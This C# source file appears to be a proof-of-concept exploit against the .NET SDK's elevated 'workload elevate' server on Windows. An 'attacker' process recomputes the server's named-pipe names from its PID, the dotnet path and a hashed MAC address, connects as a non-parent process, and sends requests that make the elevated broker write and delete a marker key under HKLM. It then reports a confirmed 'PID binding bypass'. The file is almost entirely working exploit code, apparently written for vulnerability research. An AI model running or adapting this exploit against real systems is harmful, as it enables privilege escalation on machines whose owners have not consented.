using System.Diagnostics;
using System.IO.Hashing;
using System.IO.Pipes;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using Microsoft.Win32;

internal static class Program
{
    private const string MarkerWorkload = "research.pipe-hijack.marker";
    private const string FeatureBand = "10.0.100";

    public static async Task<int> Main(string[] args)
    {
        if (!OperatingSystem.IsWindows())
        {
            Console.WriteLine("WINDOWS_ONLY=True");
            return 0;
        }

        if (args.Length > 0 && args[0] == "attacker")
        {
            return await RunAttackerAsync(
                serverPid: int.Parse(args[1]),
                expectedParentPid: int.Parse(args[2]));
        }

        return await RunParentAsync();
    }

    private static async Task<int> RunParentAsync()
    {
        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
        bool isAdmin = new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator);
        Console.WriteLine($"PARENT_PID={Environment.ProcessId}");
        Console.WriteLine($"PARENT_SID={identity.User?.Value}");
        Console.WriteLine($"PARENT_IS_ADMIN={isAdmin}");
        Console.WriteLine($"DOTNET_PATH={Environment.ProcessPath}");
        Console.WriteLine($"RUNTIME={RuntimeInformation.FrameworkDescription}");

        if (!isAdmin)
        {
            Console.WriteLine("PROBE_SKIPPED_NOT_ADMIN=True");
            return 2;
        }

        string dotnet = Environment.ProcessPath
            ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.");
        string dll = Assembly.GetExecutingAssembly().Location;
        string clientTemp = Path.GetFullPath(Path.GetTempPath()).TrimEnd(Path.DirectorySeparatorChar);

        var serverStart = new ProcessStartInfo
        {
            FileName = dotnet,
            Arguments = $"workload elevate --client-temp \"{clientTemp}\"",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };

        using Process server = Process.Start(serverStart)
            ?? throw new InvalidOperationException("Failed to start workload elevate server.");

        Console.WriteLine($"SERVER_PID={server.Id}");

        var attackerStart = new ProcessStartInfo
        {
            FileName = dotnet,
            Arguments = $"\"{dll}\" attacker {server.Id} {Environment.ProcessId}",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };

        using Process attacker = Process.Start(attackerStart)
            ?? throw new InvalidOperationException("Failed to start attacker process.");

        string attackerStdout = await attacker.StandardOutput.ReadToEndAsync();
        string attackerStderr = await attacker.StandardError.ReadToEndAsync();
        await attacker.WaitForExitAsync();

        Console.WriteLine("=== ATTACKER STDOUT ===");
        Console.Write(attackerStdout);
        Console.WriteLine("=== ATTACKER STDERR ===");
        Console.Write(attackerStderr);
        Console.WriteLine($"ATTACKER_EXIT={attacker.ExitCode}");

        if (!server.HasExited)
        {
            if (!server.WaitForExit(5000))
            {
                server.Kill(entireProcessTree: true);
                await server.WaitForExitAsync();
            }
        }

        string serverStdout = await server.StandardOutput.ReadToEndAsync();
        string serverStderr = await server.StandardError.ReadToEndAsync();
        Console.WriteLine("=== SERVER STDOUT ===");
        Console.Write(serverStdout);
        Console.WriteLine("=== SERVER STDERR ===");
        Console.Write(serverStderr);
        Console.WriteLine($"SERVER_EXIT={server.ExitCode}");

        bool confirmed =
            attackerStdout.Contains("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
            attackerStdout.Contains("HKLM_MARKER_CREATED=True", StringComparison.Ordinal) &&
            attackerStdout.Contains("HKLM_MARKER_CLEANED=True", StringComparison.Ordinal) &&
            attackerStdout.Contains("ELEVATED_BROKER_NON_PARENT_ACCEPTED=CONFIRMED", StringComparison.Ordinal);

        Console.WriteLine($"SDK_WORKLOAD_PIPE_PID_BINDING_BYPASS={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
        return confirmed ? 0 : 1;
    }

    private static async Task<int> RunAttackerAsync(int serverPid, int expectedParentPid)
    {
        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
        Console.WriteLine($"EXPECTED_PARENT_PID={expectedParentPid}");
        Console.WriteLine($"ATTACKER_PID={Environment.ProcessId}");
        Console.WriteLine($"ATTACKER_SID={identity.User?.Value}");
        Console.WriteLine($"ATTACKER_DIFFERS_FROM_PARENT={Environment.ProcessId != expectedParentPid}");

        string dispatchPipeName = CreatePipeName(serverPid);
        string logPipeName = CreatePipeName(serverPid, "log");
        Console.WriteLine($"DISPATCH_PIPE={dispatchPipeName}");
        Console.WriteLine($"LOG_PIPE={logPipeName}");

        using var dispatch = new NamedPipeClientStream(".", dispatchPipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
        using var log = new NamedPipeClientStream(".", logPipeName, PipeDirection.InOut, PipeOptions.Asynchronous);

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
        Task dispatchConnect = dispatch.ConnectAsync(cts.Token);
        Task logConnect = log.ConnectAsync(cts.Token);
        await Task.WhenAll(dispatchConnect, logConnect);

        Console.WriteLine("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True");
        Console.WriteLine("LOG_PIPE_CONNECTED_BY_NON_PARENT=True");

        using var logDrainCts = new CancellationTokenSource();
        Task logDrain = DrainLogAsync(log, logDrainCts.Token);

        string architecture = RuntimeInformation.ProcessArchitecture.ToString().ToLowerInvariant();
        string markerPath = $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}\{MarkerWorkload}";

        try
        {
            string writeResponse = await SendRequestAsync(dispatch, new
            {
                WorkloadId = MarkerWorkload,
                RequestType = 400,
                SdkFeatureBand = FeatureBand,
            });
            Console.WriteLine($"WRITE_RESPONSE={writeResponse}");

            bool created = Registry.LocalMachine.OpenSubKey(markerPath) is RegistryKey;
            Console.WriteLine($"HKLM_MARKER_PATH={markerPath}");
            Console.WriteLine($"HKLM_MARKER_CREATED={created}");

            string deleteResponse = await SendRequestAsync(dispatch, new
            {
                WorkloadId = MarkerWorkload,
                RequestType = 401,
                SdkFeatureBand = FeatureBand,
            });
            Console.WriteLine($"DELETE_RESPONSE={deleteResponse}");

            bool cleaned = Registry.LocalMachine.OpenSubKey(markerPath) is null;
            Console.WriteLine($"HKLM_MARKER_CLEANED={cleaned}");

            string shutdownResponse = await SendRequestAsync(dispatch, new { RequestType = 0 });
            Console.WriteLine($"SHUTDOWN_RESPONSE={shutdownResponse}");

            bool confirmed = Environment.ProcessId != expectedParentPid && created && cleaned;
            Console.WriteLine($"ELEVATED_BROKER_NON_PARENT_ACCEPTED={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
            return confirmed ? 0 : 1;
        }
        finally
        {
            logDrainCts.Cancel();
            try { await logDrain; } catch { }

            // Best-effort cleanup if the delete request did not complete.
            try
            {
                using RegistryKey? parent = Registry.LocalMachine.OpenSubKey(
                    $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}",
                    writable: true);
                parent?.DeleteSubKeyTree(MarkerWorkload, throwOnMissingSubKey: false);
            }
            catch
            {
            }
        }
    }

    private static async Task<string> SendRequestAsync(NamedPipeClientStream pipe, object request)
    {
        byte[] payload = JsonSerializer.SerializeToUtf8Bytes(request);
        byte[] header = BitConverter.GetBytes(payload.Length);
        await pipe.WriteAsync(header);
        await pipe.WriteAsync(payload);
        await pipe.FlushAsync();

        byte[] lengthBytes = new byte[4];
        await ReadExactlyAsync(pipe, lengthBytes);
        int length = BitConverter.ToInt32(lengthBytes, 0);
        if (length < 0 || length > 2044)
        {
            throw new InvalidDataException($"Unexpected response length: {length}");
        }

        byte[] response = new byte[length];
        await ReadExactlyAsync(pipe, response);
        return Encoding.UTF8.GetString(response);
    }

    private static async Task ReadExactlyAsync(Stream stream, byte[] buffer)
    {
        int read = 0;
        while (read < buffer.Length)
        {
            int n = await stream.ReadAsync(buffer.AsMemory(read));
            if (n == 0)
            {
                throw new EndOfStreamException();
            }
            read += n;
        }
    }

    private static async Task DrainLogAsync(Stream stream, CancellationToken cancellationToken)
    {
        byte[] buffer = new byte[4096];
        try
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                int read = await stream.ReadAsync(buffer, cancellationToken);
                if (read == 0)
                {
                    return;
                }
                Console.WriteLine($"LOG_BYTES_DRAINED={read}");
            }
        }
        catch (Exception ex) when (ex is OperationCanceledException or IOException or ObjectDisposedException)
        {
        }
    }

    private static string CreatePipeName(int processId, params string[] values)
    {
        string processPath = (Environment.ProcessPath
            ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.")).ToLowerInvariant();

        string mac = GetMacAddress()
            ?? throw new InvalidOperationException("No usable MAC address found.");

        string hashedMac = Convert.ToHexStringLower(SHA256.HashData(Encoding.UTF8.GetBytes(mac)));
        string name = $"{processId};{processPath};{hashedMac};{string.Join(";", values)}";
        return CreateUuid(name).ToString("B");
    }

    private static string? GetMacAddress()
    {
        return NetworkInterface.GetAllNetworkInterfaces()
            .Where(nic => nic.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                          nic.NetworkInterfaceType != NetworkInterfaceType.Tunnel)
            .Select(nic => nic.GetPhysicalAddress().GetAddressBytes())
            .Where(bytes => bytes.Length == 6 && bytes.Any(b => b != 0))
            .Select(bytes => string.Join("-", bytes.Select(b => b.ToString("X2"))))
            .FirstOrDefault();
    }

    private static Guid CreateUuid(string name)
    {
        Guid namespaceId = new("28F1468D-672B-489A-8E0C-7C5B3030630C");
        byte[] nameBytes = Encoding.UTF8.GetBytes(name);
        byte[] namespaceBytes = namespaceId.ToByteArray();

        SwapGuidByteOrder(namespaceBytes);

        byte[] streamToHash = new byte[namespaceBytes.Length + nameBytes.Length];
        Array.Copy(namespaceBytes, streamToHash, namespaceBytes.Length);
        Array.Copy(nameBytes, 0, streamToHash, namespaceBytes.Length, nameBytes.Length);

        byte[] hashResult = XxHash128.Hash(streamToHash);
        byte[] result = new byte[16];
        Array.Copy(hashResult, result, result.Length);

        result[6] = (byte)(0x80 | (result[6] & 0x0F));
        result[8] = (byte)(0x40 | (result[8] & 0x3F));
        SwapGuidByteOrder(result);

        return new Guid(result);
    }

    private static void SwapGuidByteOrder(byte[] b)
    {
        Swap(b, 0, 3);
        Swap(b, 1, 2);
        Swap(b, 5, 6);
        Swap(b, 7, 8);
    }

    private static void Swap(byte[] b, int x, int y)
        => (b[x], b[y]) = (b[y], b[x]);
}
